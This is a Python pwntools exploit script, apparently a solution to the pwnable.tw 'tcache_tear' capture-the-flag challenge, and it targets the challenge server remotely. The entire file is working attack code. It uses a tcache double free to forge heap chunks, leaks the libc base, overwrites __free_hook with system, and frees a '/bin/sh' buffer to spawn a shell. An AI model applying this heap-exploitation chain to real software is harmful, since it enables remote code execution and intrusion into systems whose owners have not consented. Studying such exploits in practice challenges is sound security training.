#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']
success = lambda name, value: log.success('{} -> {:#x}'.format(name, value))
def debug():
    if local == 0:
        return
    binaryname = 'tcache_tear'
    interruptPoint=[0xb54, 0xc54]
    pid = int(os.popen('pgrep {}'.format(binaryname)).readlines()[-1])
    maps = os.popen('cat /proc/{}/maps'.format(pid))
    ELFaddr = 0
    libcaddr = 0
    for inf in maps.readlines():
        if ELFaddr == 0:
            if binaryname in inf:
                ELFaddr = int(inf.split('-', 1)[0], 16)
        if libcaddr == 0:
            if 'libc' in inf:
                libcaddr = int(inf.split('-', 1)[0], 16)
    info('pid : {}'.format(pid))
    success('elfbase', ELFaddr)
    success('libcbase', libcaddr)
    if len(interruptPoint) :
        for p in interruptPoint:
            success('interruptPoint', p+ELFaddr)
    raw_input('debug>')
local = 0
# io = process('./tcache_tear')
io = remote('chall.pwnable.tw', 10207)
elf = ELF('./tcache_tear')
name = 0x602060
libc = ELF('./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')
# same as libc in docker
mainarena = 0x3ebc40
freehook = 0x3ed8e8

def add(size, content):
    io.sendlineafter('choice :', '1')
    info('add {}'.format(size))
    io.sendlineafter('Size:', str(size))
    io.sendlineafter('Data:', content)


def show():
    io.sendlineafter('choice :', '3')
    info('show')

def delete():
    io.sendlineafter('choice :', '2')
    info('delete')

if __name__ == '__main__':
    io.sendlineafter('Name:', 'aaaa')
    add(0x80, 'aaaa')
    delete()
    delete()
    debug()
    # prepare for 0x602060 + 0x420 = 0x602480
    add(0x80, p64(name + 0x420 - 0x10))
    add(0x80, 'bbbb')
    add(0x80, p64(0) + p64(0x21) + 'c' * 0x10 + p64(0) + p64(0x21))

    add(0x8, 'cccc')
    delete()
    delete()
    add(0x8, p64(name-0x10)) # tcache entry points to user data
    add(0x8, 'dddd')
    add(0x8, p64(0) + p64(0x421) + 'a' * 0x28 + p64(0x602060))

    delete() # size over tcache, enter unsorted bin, get libc base
    show()
    io.recvuntil('Name :')
    libcbase = u64(io.recv(8)) - mainarena - 96
    success('libcbase', libcbase)
    libc.address = libcbase
    sys = libc.sym['system']
    success('system', sys)
    freehook = libcbase + freehook

    # clear unsortedbin
    # for i in range(0x420/0x20):
    #     add(0x8, 'waste')
    add(0x40, 'eeee')
    delete()
    delete()
    add(0x40, p64(freehook))
    add(0x40, 'ffff')
    add(0x40, p64(sys))
    info('freehook is equal to system now')
    add(0x40, '/bin/sh')
    delete()


    io.interactive()
    io.close()


